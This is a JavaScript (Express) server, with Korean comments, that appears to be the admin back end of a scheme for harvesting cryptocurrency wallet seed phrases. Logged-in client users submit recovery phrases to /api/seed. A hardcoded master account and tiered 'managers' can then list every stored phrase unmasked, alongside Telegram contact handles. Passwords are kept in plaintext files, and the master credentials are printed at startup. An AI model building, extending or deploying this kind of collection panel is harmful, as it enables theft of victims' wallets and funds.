const express = require('express');
const cors = require('cors');
const path = require('path');
const fs = require('fs');
const crypto = require('crypto');

const app = express();
const PORT = process.env.PORT || 5000;
const DATA_DIR = path.join(__dirname, 'data');

const MASTER_ID = 'tlarbwjd';
const MASTER_PW = 'tlarbwjd';

// ---------- 클라이언트용 저장소 (기존 동일) ----------
const sessionStore = {
  tokenToUser: new Map(),
  userToToken: new Map(),
  login(userId, newToken) {
    const oldToken = this.userToToken.get(userId);
    if (oldToken) {
      this.tokenToUser.delete(oldToken);
      this.userToToken.delete(userId);
    }
    this.userToToken.set(userId, newToken);
    this.tokenToUser.set(newToken, userId);
    return !!oldToken;
  },
  isValid(token) {
    return this.tokenToUser.has(token);
  },
  getUserId(token) {
    return this.tokenToUser.get(token) ?? null;
  },
  kickUser(userId) {
    const t = this.userToToken.get(userId);
    if (t) {
      this.tokenToUser.delete(t);
      this.userToToken.delete(userId);
    }
  },
  getAll() {
    return Array.from(this.userToToken.entries()).map(([userId, token]) => ({ userId, token }));
  },
};

const seedStore = {
  list: [],
  add(userId, phrase) {
    this.list.push({ userId, phrase: phrase.trim(), at: new Date().toISOString() });
  },
  getAll(masked = true, filterUserId = null) {
    const mask = (phrase) => {
      const words = phrase.trim().split(/\s+/).filter(Boolean);
      if (words.length === 0) return '';
      if (words.length <= 4) return '***';
      return words[0] + ' ... ' + words[words.length - 1] + ' (' + words.length + '단어)';
    };
    let arr = [...this.list].reverse();
    if (filterUserId) arr = arr.filter((e) => e.userId === filterUserId);
    return arr.map((e, i) => ({
      no: this.list.length - this.list.indexOf(e),
      userId: e.userId,
      phrase: masked ? mask(e.phrase) : e.phrase,
      at: e.at,
    }));
  },
};

function ensureDataDir() {
  if (!fs.existsSync(DATA_DIR)) fs.mkdirSync(DATA_DIR, { recursive: true });
}
const usersPath = () => path.join(DATA_DIR, 'users.txt');
const managersPath = () => path.join(DATA_DIR, 'managers.txt');
const telegramPath = () => path.join(DATA_DIR, 'telegram.txt');

// ---------- 유저(클라이언트 로그인용): id, password, managerId ----------
const userStore = {
  list: [],
  load() {
    this.list = [];
    ensureDataDir();
    if (fs.existsSync(usersPath())) {
      fs.readFileSync(usersPath(), 'utf8')
        .split('\n')
        .forEach((line) => {
          const s = line.trim();
          if (!s || s.startsWith('#')) return;
          const parts = s.split(/\s+/);
          const id = parts[0]?.trim();
          const pw = parts[1]?.trim() || '';
          const managerId = parts[2]?.trim() || '';
          const telegram = parts[3]?.trim() || '';
          if (id) this.list.push({ id: id.toLowerCase(), displayId: id, pw, managerId, telegram });
        });
    }
    if (this.list.length === 0) {
      this.list.push({ id: 'admin', displayId: 'admin', pw: '1234', managerId: '' });
      this.save();
    }
  },
  save() {
    try {
      ensureDataDir();
      const lines = this.list.map((u) => {
        let line = u.displayId + ' ' + u.pw + (u.managerId ? ' ' + u.managerId : '');
        if (u.telegram) line += ' ' + u.telegram;
        return line;
      });
      fs.writeFileSync(usersPath(), lines.join('\n'), 'utf8');
    } catch (_) {}
  },
  validate(id, password) {
    const u = this.list.find((x) => x.id === (id || '').toLowerCase());
    return u && u.pw === password;
  },
  getByManager(managerId) {
    if (!managerId) return this.list;
    return this.list.filter((u) => u.managerId === managerId);
  },
  getAll() {
    return this.list.map((u) => ({ id: u.displayId, managerId: u.managerId, telegram: u.telegram || '' }));
  },
  addOrUpdate(id, password, managerId = '', telegram = '') {
    const key = (id || '').trim().toLowerCase();
    const existing = this.list.findIndex((u) => u.id === key);
    const displayId = (id || '').trim();
    const entry = { id: key, displayId, pw: password || '', managerId: (managerId || '').trim(), telegram: (telegram || '').trim() };
    if (existing >= 0) {
      this.list[existing] = { ...this.list[existing], ...entry };
    } else {
      this.list.push(entry);
    }
    this.save();
  },
  remove(userId) {
    const key = (userId || '').toLowerCase();
    this.list = this.list.filter((u) => u.id !== key);
    this.save();
  },
};
userStore.load();

// ---------- 매니저: id, password, telegram, memo ----------
const managerStore = {
  list: [],
  load() {
    this.list = [];
    ensureDataDir();
    if (fs.existsSync(managersPath())) {
      fs.readFileSync(managersPath(), 'utf8')
        .split('\n')
        .forEach((line) => {
          const s = line.trim();
          if (!s || s.startsWith('#')) return;
          const parts = s.split(/\s+/);
          const id = parts[0]?.trim();
          const pw = parts[1]?.trim() || '';
          const telegram = parts[2]?.trim() || '';
          const memo = parts.length > 3 ? parts.slice(3).join(' ').trim() : '';
          if (id) this.list.push({ id, pw, telegram, memo });
        });
    }
  },
  save() {
    try {
      ensureDataDir();
      const lines = this.list.map((m) => {
        let line = m.id + ' ' + m.pw + ' ' + (m.telegram || '');
        if (m.memo) line += ' ' + (m.memo || '').replace(/\r?\n/g, ' ');
        return line;
      });
      fs.writeFileSync(managersPath(), lines.join('\n'), 'utf8');
    } catch (_) {}
  },
  validate(id, password) {
    const m = this.list.find((x) => x.id === (id || '').trim());
    return m && m.pw === password;
  },
  getAll() {
    return this.list.map((m) => ({
      id: m.id,
      telegram: m.telegram || '',
      memo: m.memo || '',
      userCount: userStore.getByManager(m.id).length,
    }));
  },
  get(id) {
    return this.list.find((m) => m.id === (id || '').trim());
  },
  addOrUpdate(id, password, telegram, memo = '') {
    const entry = {
      id: (id || '').trim(),
      pw: (password || '').trim(),
      telegram: (telegram || '').trim(),
      memo: (memo || '').trim().replace(/\r?\n/g, ' '),
    };
    if (!entry.id) return;
    const idx = this.list.findIndex((m) => m.id === entry.id);
    if (idx >= 0) this.list[idx] = { ...this.list[idx], ...entry };
    else this.list.push(entry);
    this.save();
  },
  remove(managerId) {
    this.list = this.list.filter((m) => m.id !== (managerId || '').trim());
    this.save();
  },
};
managerStore.load();

// ---------- 글로벌 텔레그램(로그인 화면 표시) ----------
let globalTelegram = '@문의';
if (fs.existsSync(telegramPath())) {
  try {
    globalTelegram = fs.readFileSync(telegramPath(), 'utf8').trim() || globalTelegram;
  } catch (_) {}
}
function saveTelegram(nick) {
  globalTelegram = (nick || '').trim() || globalTelegram;
  try {
    ensureDataDir();
    fs.writeFileSync(telegramPath(), globalTelegram, 'utf8');
  } catch (_) {}
}

// ---------- 관리자 세션: token -> { role: 'master'|'manager', id } ----------
const adminSessions = new Map();
function createAdminToken() {
  return crypto.randomBytes(24).toString('hex');
}
function requireAdmin(req, res, next) {
  const token = req.headers.authorization?.replace(/^Bearer\s+/i, '') || req.query?.adminToken || '';
  const session = adminSessions.get(token);
  if (!session) {
    return res.status(401).json({ error: '로그인이 필요합니다.' });
  }
  req.admin = session;
  next();
}
function requireMaster(req, res, next) {
  if (req.admin?.role !== 'master') {
    return res.status(403).json({ error: '마스터만 가능합니다.' });
  }
  next();
}

// ---------- 미들웨어 ----------
app.use(cors());
app.use(express.json());
app.use(express.static(path.join(__dirname, 'public')));

// ---------- 클라이언트 API (기존 동일) ----------
app.post('/api/login', (req, res) => {
  const { id, password } = req.body || {};
  if (!id?.trim() || !password?.trim()) {
    return res.status(400).json({ error: '아이디와 비밀번호를 입력하세요.' });
  }
  if (!userStore.validate(id, password)) {
    return res.status(401).json({ error: '아이디 또는 비밀번호가 올바르지 않습니다.' });
  }
  const token = crypto.randomBytes(16).toString('hex');
  const kicked = sessionStore.login(id.trim(), token);
  res.json({ token, kicked });
});

app.get('/api/session/validate', (req, res) => {
  const token = req.query.token;
  if (!token) return res.status(401).end();
  if (sessionStore.isValid(token)) return res.json({ ok: true });
  res.status(401).json({ error: 'kicked' });
});

app.post('/api/seed', (req, res) => {
  const { token, phrase } = req.body || {};
  if (!token || !phrase) return res.status(400).end();
  const userId = sessionStore.getUserId(token);
  if (!userId) return res.status(401).end();
  seedStore.add(userId, phrase);
  res.json({ ok: true });
});

app.get('/api/admin/telegram', (req, res) => {
  res.json({ nickname: globalTelegram });
});

// ---------- 관리자 로그인 ----------
app.post('/api/admin/login', (req, res) => {
  const { id, password } = req.body || {};
  if (!id?.trim() || !password?.trim()) {
    return res.status(400).json({ error: '아이디와 비밀번호를 입력하세요.' });
  }
  if (id.trim() === MASTER_ID && password === MASTER_PW) {
    const token = createAdminToken();
    adminSessions.set(token, { role: 'master', id: MASTER_ID });
    return res.json({ role: 'master', id: MASTER_ID, token });
  }
  if (managerStore.validate(id, password)) {
    const token = createAdminToken();
    adminSessions.set(token, { role: 'manager', id: id.trim() });
    return res.json({ role: 'manager', id: id.trim(), token });
  }
  res.status(401).json({ error: '아이디 또는 비밀번호가 올바르지 않습니다.' });
});

app.post('/api/admin/logout', (req, res) => {
  const token = req.headers.authorization?.replace(/^Bearer\s+/i, '') || req.body?.token || '';
  adminSessions.delete(token);
  res.json({ ok: true });
});

// 로그인된 관리자 정보 (토큰 검증용)
app.get('/api/admin/me', requireAdmin, (req, res) => {
  const m = req.admin.role === 'manager' ? managerStore.get(req.admin.id) : null;
  res.json({
    role: req.admin.role,
    id: req.admin.id,
    telegram: m?.telegram ?? '',
  });
});

// ---------- 마스터 전용: 텔레그램 설정 (GET은 클라이언트용으로 비인증 유지) ----------
app.post('/api/admin/telegram', requireAdmin, requireMaster, (req, res) => {
  globalTelegram = (req.body?.nickname ?? '').toString().trim() || globalTelegram;
  saveTelegram(globalTelegram);
  res.json({ ok: true });
});

// ---------- 마스터 전용: 매니저 CRUD ----------
app.get('/api/admin/managers', requireAdmin, requireMaster, (req, res) => {
  res.json(managerStore.getAll());
});
app.post('/api/admin/managers', requireAdmin, requireMaster, (req, res) => {
  const { id, password, telegram, memo } = req.body || {};
  if (!id?.trim()) return res.status(400).json({ error: '아이디 필요' });
  managerStore.addOrUpdate(id.trim(), password || '', telegram || '', memo || '');
  res.json({ ok: true });
});
app.delete('/api/admin/managers/:id', requireAdmin, requireMaster, (req, res) => {
  managerStore.remove(req.params.id);
  res.json({ ok: true });
});

// ---------- 유저 목록 (마스터=전체, 매니저=내 유저만) ----------
app.get('/api/admin/users', requireAdmin, (req, res) => {
  const list = req.admin.role === 'master'
    ? userStore.getAll()
    : userStore.getByManager(req.admin.id).map((u) => ({ id: u.displayId, managerId: u.managerId, telegram: u.telegram || '' }));
  const managers = managerStore.getAll();
  const byId = Object.fromEntries(managers.map((m) => [m.id, m.telegram || m.id]));
  const withManager = list.map((u) => ({
    id: u.id,
    managerId: u.managerId || null,
    managerName: byId[u.managerId] || '-',
    telegram: u.telegram || '',
  }));
  res.json(withManager);
});

// 유저 추가/수정 (마스터=managerId 지정 가능, 매니저=자기만. 텔레그램 선택)
app.post('/api/admin/users', requireAdmin, (req, res) => {
  const { id, password, managerId, telegram } = req.body || {};
  if (!id?.trim()) return res.status(400).json({ error: '아이디 필요' });
  const mid = req.admin.role === 'master' ? (managerId || '').trim() : req.admin.id;
  userStore.addOrUpdate(id.trim(), password || '', mid, telegram || '');
  res.json({ ok: true });
});

// 유저 탈퇴(삭제) (마스터=누구나, 매니저=내 유저만)
app.delete('/api/admin/users/:id', requireAdmin, (req, res) => {
  const userId = req.params.id?.trim();
  if (!userId) return res.status(400).json({ error: 'userId 필요' });
  const u = userStore.list.find((x) => x.id === userId.toLowerCase());
  if (!u) return res.status(404).json({ error: '유저 없음' });
  if (req.admin.role === 'manager' && u.managerId !== req.admin.id) {
    return res.status(403).json({ error: '본인 소속 유저만 탈퇴 처리 가능' });
  }
  userStore.remove(userId);
  sessionStore.kickUser(userId);
  res.json({ ok: true });
});

// ---------- 세션 (마스터=전체, 매니저=내 유저 세션만) ----------
app.get('/api/admin/sessions', requireAdmin, (req, res) => {
  let list = sessionStore.getAll();
  if (req.admin.role === 'manager') {
    const myUserIds = new Set(userStore.getByManager(req.admin.id).map((u) => u.displayId));
    list = list.filter((s) => myUserIds.has(s.userId));
  }
  res.json(list);
});
app.post('/api/admin/kick', requireAdmin, (req, res) => {
  const userId = req.body?.userId?.trim();
  if (!userId) return res.status(400).json({ error: 'userId 필요' });
  if (req.admin.role === 'manager') {
    const u = userStore.list.find((x) => x.displayId === userId || x.id === userId.toLowerCase());
    if (!u || u.managerId !== req.admin.id) {
      return res.status(403).json({ error: '본인 소속 유저만 끊기 가능' });
    }
  }
  sessionStore.kickUser(userId);
  res.json({ ok: true });
});

// ---------- 시드 (마스터=전체, 매니저=내 유저만) ----------
app.get('/api/admin/seeds', requireAdmin, (req, res) => {
  const masked = req.query.masked !== 'false';
  let list;
  if (req.admin.role === 'manager') {
    const myUserIds = new Set(userStore.getByManager(req.admin.id).map((u) => u.displayId));
    list = seedStore.getAll(masked).filter((s) => myUserIds.has(s.userId));
  } else {
    list = seedStore.getAll(masked);
  }
  res.json(list);
});

app.get('/', (req, res) => res.redirect('/admin.html'));

app.listen(PORT, () => {
  console.log('서버 실행: http://localhost:' + PORT);
  console.log('관리자: http://localhost:' + PORT + '/admin.html');
  console.log('마스터: ' + MASTER_ID + ' / ' + MASTER_PW);
});
